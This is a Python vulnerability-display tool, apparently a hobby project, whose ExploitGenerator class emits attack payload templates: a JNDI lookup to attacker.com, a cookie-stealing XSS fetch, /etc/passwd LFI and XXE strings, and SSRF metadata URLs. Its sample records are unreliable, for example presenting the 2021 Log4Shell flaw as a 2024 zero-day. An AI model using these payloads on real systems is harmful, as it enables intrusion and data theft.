#!/usr/bin/env python3
"""
Zero-Day Vulnerability Display Module
Author: Sayer Linux (SayerLinux1@gmail.com)
Description: Advanced tool for displaying, analyzing, and managing zero-day vulnerabilities
"""

import json
import requests
import datetime
import re
from colorama import Fore, Style, Back
from tabulate import tabulate
import textwrap
import os

class ZeroDayDisplay:
    def __init__(self):
        self.zero_day_database = []
        self.ai_analysis_engine = AIAnalysisEngine()
        self.exploit_generator = ExploitGenerator()
        self.risk_calculator = RiskCalculator()
        
        # Initialize with sample zero-day vulnerabilities
        self.initialize_sample_data()
    
    def initialize_sample_data(self):
        """Initialize with sample zero-day vulnerabilities for demonstration"""
        sample_vulns = [
            {
                "id": "ZDAY-2024-001",
                "title": "Critical RCE in Apache Log4j 2.x",
                "severity": "Critical",
                "cvss_score": 10.0,
                "affected_systems": ["Apache Log4j 2.0-2.14.1", "Spring Boot", "Elasticsearch"],
                "description": "Remote code execution vulnerability in Log4j's JNDI lookup feature allowing unauthenticated remote code execution.",
                "discovery_date": "2024-01-15",
                "disclosure_status": "Public",
                "exploit_available": True,
                "exploit_complexity": "Low",
                "impact": "Complete system compromise",
                "mitigation": "Update to Log4j 2.15.0+ or set -Dlog4j2.formatMsgNoLookups=true",
                "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"],
                "tags": ["RCE", "JNDI", "Log4Shell", "Critical"],
                "ai_analysis": "High probability of widespread exploitation. Immediate patching required."
            },
            {
                "id": "ZDAY-2024-002",
                "title": "Zero-Day in Windows Print Spooler",
                "severity": "High",
                "cvss_score": 8.8,
                "affected_systems": ["Windows 10", "Windows 11", "Windows Server 2019/2022"],
                "description": "Local privilege escalation vulnerability in Windows Print Spooler service allowing SYSTEM privileges.",
                "discovery_date": "2024-02-20",
                "disclosure_status": "Limited",
                "exploit_available": True,
                "exploit_complexity": "Medium",
                "impact": "Local privilege escalation to SYSTEM",
                "mitigation": "Disable Print Spooler service or apply latest Windows updates",
                "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-0012"],
                "tags": ["LPE", "PrintSpooler", "Windows", "PrivilegeEscalation"],
                "ai_analysis": "Active exploitation observed in targeted attacks. High priority for patch management."
            },
            {
                "id": "ZDAY-2024-003",
                "title": "SQL Injection in Popular CMS",
                "severity": "Critical",
                "cvss_score": 9.1,
                "affected_systems": ["WordPress 6.0-6.3", "Joomla 4.x", "Drupal 9.x"],
                "description": "Unauthenticated SQL injection vulnerability allowing database manipulation and data extraction.",
                "discovery_date": "2024-03-10",
                "disclosure_status": "Public",
                "exploit_available": True,
                "exploit_complexity": "Low",
                "impact": "Database compromise, data theft",
                "mitigation": "Update to latest CMS version, implement WAF rules",
                "references": ["https://wpscan.com/vulnerability/12345"],
                "tags": ["SQLi", "CMS", "Database", "Unauthenticated"],
                "ai_analysis": "Mass scanning and exploitation detected. Immediate action required."
            }
        ]
        
        self.zero_day_database.extend(sample_vulns)
    
    def display_zero_days(self, filter_severity=None, filter_status=None, search_term=None):
        """Display zero-day vulnerabilities with filtering options"""
        print(f"\n{Fore.CYAN}{'='*100}{Style.RESET_ALL}")
        print(f"{Fore.RED}{Back.WHITE} 🔥 ZERO-DAY VULNERABILITY DISPLAY TOOL 🔥 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*100}{Style.RESET_ALL}")
        
        # Filter vulnerabilities based on criteria
        filtered_vulns = self.filter_vulnerabilities(filter_severity, filter_status, search_term)
        
        if not filtered_vulns:
            print(f"\n{Fore.YELLOW}⚠️  No zero-day vulnerabilities found matching the specified criteria.{Style.RESET_ALL}")
            return
        
        # Display summary statistics
        self.display_statistics(filtered_vulns)
        
        # Display detailed vulnerability information
        for vuln in filtered_vulns:
            self.display_vulnerability_details(vuln)
        
        # Display risk assessment
        self.display_risk_assessment(filtered_vulns)
    
    def filter_vulnerabilities(self, severity=None, status=None, search_term=None):
        """Filter vulnerabilities based on criteria"""
        filtered = self.zero_day_database.copy()
        
        if severity:
            filtered = [v for v in filtered if v['severity'].lower() == severity.lower()]
        
        if status:
            filtered = [v for v in filtered if v['disclosure_status'].lower() == status.lower()]
        
        if search_term:
            search_term = search_term.lower()
            filtered = [v for v in filtered if 
                       search_term in v['title'].lower() or
                       search_term in v['description'].lower() or
                       any(search_term in tag.lower() for tag in v['tags']) or
                       any(search_term in system.lower() for system in v['affected_systems'])]
        
        return filtered
    
    def display_statistics(self, vulnerabilities):
        """Display vulnerability statistics"""
        total = len(vulnerabilities)
        critical = len([v for v in vulnerabilities if v['severity'] == 'Critical'])
        high = len([v for v in vulnerabilities if v['severity'] == 'High'])
        medium = len([v for v in vulnerabilities if v['severity'] == 'Medium'])
        low = len([v for v in vulnerabilities if v['severity'] == 'Low'])
        
        public = len([v for v in vulnerabilities if v['disclosure_status'] == 'Public'])
        limited = len([v for v in vulnerabilities if v['disclosure_status'] == 'Limited'])
        private = len([v for v in vulnerabilities if v['disclosure_status'] == 'Private'])
        
        exploit_available = len([v for v in vulnerabilities if v['exploit_available']])
        
        print(f"\n{Fore.GREEN}📊 ZERO-DAY STATISTICS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─'*50}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Total Vulnerabilities: {Fore.YELLOW}{total}{Style.RESET_ALL}")
        print(f"{Fore.RED}Critical: {critical} | {Fore.MAGENTA}High: {high} | {Fore.YELLOW}Medium: {medium} | {Fore.GREEN}Low: {low}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Public: {public} | Limited: {limited} | Private: {private}{Style.RESET_ALL}")
        print(f"{Fore.RED}Exploits Available: {exploit_available}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─'*50}{Style.RESET_ALL}")
    
    def display_vulnerability_details(self, vuln):
        """Display detailed information for a single vulnerability"""
        severity_color = self.get_severity_color(vuln['severity'])
        
        print(f"\n{severity_color}{'▓'*80}{Style.RESET_ALL}")
        print(f"{severity_color}🔥 {vuln['id']} - {vuln['title'].upper()}{Style.RESET_ALL}")
        print(f"{severity_color}{'▓'*80}{Style.RESET_ALL}")
        
        # Basic Information
        print(f"\n{Fore.CYAN}📋 BASIC INFORMATION{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Severity: {severity_color}{vuln['severity']} (CVSS: {vuln['cvss_score']}/10){Style.RESET_ALL}")
        print(f"{Fore.WHITE}Discovery Date: {Fore.YELLOW}{vuln['discovery_date']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Disclosure Status: {Fore.MAGENTA}{vuln['disclosure_status']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Exploit Available: {Fore.RED if vuln['exploit_available'] else Fore.GREEN}{'YES' if vuln['exploit_available'] else 'NO'}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Exploit Complexity: {Fore.YELLOW}{vuln['exploit_complexity']}{Style.RESET_ALL}")
        
        # Description
        print(f"\n{Fore.CYAN}📝 DESCRIPTION{Style.RESET_ALL}")
        wrapped_desc = textwrap.fill(vuln['description'], width=80)
        print(f"{Fore.WHITE}{wrapped_desc}{Style.RESET_ALL}")
        
        # Affected Systems
        print(f"\n{Fore.CYAN}🎯 AFFECTED SYSTEMS{Style.RESET_ALL}")
        for system in vuln['affected_systems']:
            print(f"  {Fore.RED}• {system}{Style.RESET_ALL}")
        
        # Impact and Mitigation
        print(f"\n{Fore.CYAN}💥 IMPACT{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{vuln['impact']}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}🛡️  MITIGATION{Style.RESET_ALL}")
        wrapped_mitigation = textwrap.fill(vuln['mitigation'], width=80)
        print(f"{Fore.GREEN}{wrapped_mitigation}{Style.RESET_ALL}")
        
        # Tags
        print(f"\n{Fore.CYAN}🏷️  TAGS{Style.RESET_ALL}")
        tags_str = ", ".join([f"#{tag}" for tag in vuln['tags']])
        print(f"{Fore.YELLOW}{tags_str}{Style.RESET_ALL}")
        
        # AI Analysis
        if vuln.get('ai_analysis'):
            print(f"\n{Fore.CYAN}🤖 AI ANALYSIS{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}{vuln['ai_analysis']}{Style.RESET_ALL}")
        
        # References
        if vuln.get('references'):
            print(f"\n{Fore.CYAN}🔗 REFERENCES{Style.RESET_ALL}")
            for ref in vuln['references']:
                print(f"  {Fore.BLUE}• {ref}{Style.RESET_ALL}")
    
    def display_risk_assessment(self, vulnerabilities):
        """Display overall risk assessment"""
        print(f"\n{Fore.RED}{'='*100}{Style.RESET_ALL}")
        print(f"{Fore.RED}{Back.WHITE} ⚠️  RISK ASSESSMENT ⚠️  {Style.RESET_ALL}")
        print(f"{Fore.RED}{'='*100}{Style.RESET_ALL}")
        
        # Calculate overall risk score
        risk_score = self.risk_calculator.calculate_overall_risk(vulnerabilities)
        
        print(f"\n{Fore.CYAN}🎯 OVERALL RISK SCORE: {self.get_risk_color(risk_score)}{risk_score}/100{Style.RESET_ALL}")
        
        # AI-generated recommendations
        recommendations = self.ai_analysis_engine.generate_recommendations(vulnerabilities)
        
        print(f"\n{Fore.CYAN}💡 AI RECOMMENDATIONS{Style.RESET_ALL}")
        for i, rec in enumerate(recommendations, 1):
            print(f"{Fore.YELLOW}{i}. {rec}{Style.RESET_ALL}")
        
        # Exploitation probability
        exploit_prob = self.risk_calculator.calculate_exploitation_probability(vulnerabilities)
        print(f"\n{Fore.CYAN}🔥 EXPLOITATION PROBABILITY: {self.get_risk_color(exploit_prob*100)}{exploit_prob*100:.1f}%{Style.RESET_ALL}")
    
    def get_severity_color(self, severity):
        """Get color based on severity level"""
        colors = {
            'Critical': Fore.RED + Back.WHITE,
            'High': Fore.RED,
            'Medium': Fore.YELLOW,
            'Low': Fore.GREEN
        }
        return colors.get(severity, Fore.WHITE)
    
    def get_risk_color(self, risk_score):
        """Get color based on risk score"""
        if risk_score >= 80:
            return Fore.RED + Back.WHITE
        elif risk_score >= 60:
            return Fore.RED
        elif risk_score >= 40:
            return Fore.YELLOW
        else:
            return Fore.GREEN
    
    def add_zero_day(self, vulnerability_data):
        """Add a new zero-day vulnerability to the database"""
        vuln_id = f"ZDAY-{datetime.datetime.now().year}-{len(self.zero_day_database)+1:03d}"
        vulnerability_data['id'] = vuln_id
        vulnerability_data['discovery_date'] = datetime.datetime.now().strftime("%Y-%m-%d")
        
        self.zero_day_database.append(vulnerability_data)
        print(f"\n{Fore.GREEN}✅ Zero-day vulnerability added successfully with ID: {vuln_id}{Style.RESET_ALL}")
        return vuln_id
    
    def export_to_json(self, filename="zero_days_export.json"):
        """Export zero-day database to JSON file"""
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.zero_day_database, f, indent=2, ensure_ascii=False)
        print(f"\n{Fore.GREEN}✅ Zero-day vulnerabilities exported to {filename}{Style.RESET_ALL}")
    
    def import_from_json(self, filename):
        """Import zero-day vulnerabilities from JSON file"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                data = json.load(f)
                self.zero_day_database.extend(data)
            print(f"\n{Fore.GREEN}✅ Zero-day vulnerabilities imported from {filename}{Style.RESET_ALL}")
        except Exception as e:
            print(f"\n{Fore.RED}❌ Error importing file: {str(e)}{Style.RESET_ALL}")


class AIAnalysisEngine:
    """AI-powered analysis engine for zero-day vulnerabilities"""
    
    def generate_recommendations(self, vulnerabilities):
        """Generate AI-powered recommendations"""
        recommendations = []
        
        critical_count = len([v for v in vulnerabilities if v['severity'] == 'Critical'])
        exploit_available = any(v['exploit_available'] for v in vulnerabilities)
        
        if critical_count > 0:
            recommendations.append("Immediate patching of critical vulnerabilities is required")
        
        if exploit_available:
            recommendations.append("Implement emergency response procedures for exploited vulnerabilities")
        
        recommendations.extend([
            "Conduct thorough security assessment of affected systems",
            "Implement network segmentation to limit potential impact",
            "Deploy intrusion detection systems with updated signatures",
            "Establish incident response team and communication protocols",
            "Consider temporary workarounds if patches are not available",
            "Monitor threat intelligence feeds for related attack campaigns"
        ])
        
        return recommendations
    
    def analyze_exploitation_patterns(self, vulnerability):
        """Analyze exploitation patterns for a vulnerability"""
        patterns = []
        
        if vulnerability['severity'] == 'Critical':
            patterns.append("High likelihood of automated exploitation")
        
        if vulnerability['exploit_complexity'] == 'Low':
            patterns.append("Script kiddie level exploitation possible")
        
        if 'RCE' in vulnerability['tags']:
            patterns.append("Remote code execution enables complete system compromise")
        
        if 'SQLi' in vulnerability['tags']:
            patterns.append("Database-focused attacks and data exfiltration expected")
        
        return patterns


class ExploitGenerator:
    """Exploit generation for zero-day vulnerabilities"""
    
    def generate_exploit_template(self, vulnerability):
        """Generate exploit template for a vulnerability"""
        templates = {
            'RCE': self.generate_rce_exploit,
            'SQLi': self.generate_sqli_exploit,
            'XSS': self.generate_xss_exploit,
            'LFI': self.generate_lfi_exploit,
            'XXE': self.generate_xxe_exploit,
            'SSRF': self.generate_ssrf_exploit
        }
        
        for tag in vulnerability['tags']:
            if tag in templates:
                return templates[tag](vulnerability)
        
        return "Generic exploit template - manual analysis required"
    
    def generate_rce_exploit(self, vuln):
        return """
# RCE Exploit Template for {}
# Target: {}

import requests
import sys

def exploit_rce(target, command):
    payload = "${{jndi:ldap://attacker.com:1389/" + command + "}}"
    # Customize payload based on specific vulnerability
    return payload

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.com"
    command = sys.argv[2] if len(sys.argv) > 2 else "id"
    result = exploit_rce(target, command)
    print(f"Payload: {{result}}")
""".format(vuln['id'], vuln['affected_systems'][0] if vuln['affected_systems'] else 'Unknown')
    
    def generate_sqli_exploit(self, vuln):
        return f"""
# SQL Injection Exploit Template for {vuln['id']}
# Target: {vuln['affected_systems'][0] if vuln['affected_systems'] else 'Unknown'}

import requests

def exploit_sqli(target, query):
    payload = f"' OR 1=1 UNION SELECT {query}--"
    # Customize payload based on specific vulnerability
    return payload
"""
    
    def generate_xss_exploit(self, vuln):
        return f"""
# XSS Exploit Template for {vuln['id']}
# Target: {vuln['affected_systems'][0] if vuln['affected_systems'] else 'Unknown'}

def exploit_xss(target):
    payload = "<script>fetch('/steal-cookies?cookie='+document.cookie)</script>"
    # Customize payload based on specific vulnerability
    return payload
"""
    
    def generate_lfi_exploit(self, vuln):
        return f"""
# LFI Exploit Template for {vuln['id']}
# Target: {vuln['affected_systems'][0] if vuln['affected_systems'] else 'Unknown'}

def exploit_lfi(target):
    payloads = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php"
    ]
    return payloads
"""
    
    def generate_xxe_exploit(self, vuln):
        return f"""
# XXE Exploit Template for {vuln['id']}
# Target: {vuln['affected_systems'][0] if vuln['affected_systems'] else 'Unknown'}

def exploit_xxe(target):
    payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
    return payload
"""
    
    def generate_ssrf_exploit(self, vuln):
        return f"""
# SSRF Exploit Template for {vuln['id']}
# Target: {vuln['affected_systems'][0] if vuln['affected_systems'] else 'Unknown'}

def exploit_ssrf(target):
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22",
        "http://127.0.0.1:3306",
        "file:///etc/passwd"
    ]
    return payloads
"""


class RiskCalculator:
    """Risk calculation for zero-day vulnerabilities"""
    
    def calculate_overall_risk(self, vulnerabilities):
        """Calculate overall risk score"""
        if not vulnerabilities:
            return 0
        
        total_score = 0
        
        for vuln in vulnerabilities:
            # Base score from CVSS
            base_score = vuln['cvss_score'] * 10
            
            # Severity multiplier
            severity_multipliers = {
                'Critical': 1.5,
                'High': 1.2,
                'Medium': 1.0,
                'Low': 0.8
            }
            multiplier = severity_multipliers.get(vuln['severity'], 1.0)
            
            # Exploit availability bonus
            exploit_bonus = 20 if vuln['exploit_available'] else 0
            
            # Complexity adjustment
            complexity_multipliers = {
                'Low': 1.3,
                'Medium': 1.0,
                'High': 0.7
            }
            complexity_mult = complexity_multipliers.get(vuln['exploit_complexity'], 1.0)
            
            vuln_score = (base_score * multiplier + exploit_bonus) * complexity_mult
            total_score += vuln_score
        
        # Average and cap at 100
        avg_score = total_score / len(vulnerabilities)
        return min(100, int(avg_score))
    
    def calculate_exploitation_probability(self, vulnerabilities):
        """Calculate probability of exploitation"""
        if not vulnerabilities:
            return 0.0
        
        total_prob = 0
        
        for vuln in vulnerabilities:
            # Base probability from severity
            base_probs = {
                'Critical': 0.9,
                'High': 0.7,
                'Medium': 0.5,
                'Low': 0.3
            }
            prob = base_probs.get(vuln['severity'], 0.5)
            
            # Adjust for exploit availability
            if vuln['exploit_available']:
                prob += 0.2
            
            # Adjust for complexity
            if vuln['exploit_complexity'] == 'Low':
                prob += 0.15
            elif vuln['exploit_complexity'] == 'High':
                prob -= 0.2
            
            total_prob += min(1.0, prob)
        
        return total_prob / len(vulnerabilities)


def main():
    """Main function for testing the zero-day display tool"""
    display = ZeroDayDisplay()
    
    print(f"\n{Fore.GREEN}🚀 Zero-Day Vulnerability Display Tool Initialized!{Style.RESET_ALL}")
    
    # Display all zero-days
    display.display_zero_days()
    
    # Example of filtering
    print(f"\n{Fore.CYAN}🔍 Displaying only Critical severity vulnerabilities:{Style.RESET_ALL}")
    display.display_zero_days(filter_severity="Critical")


if __name__ == "__main__":
    main()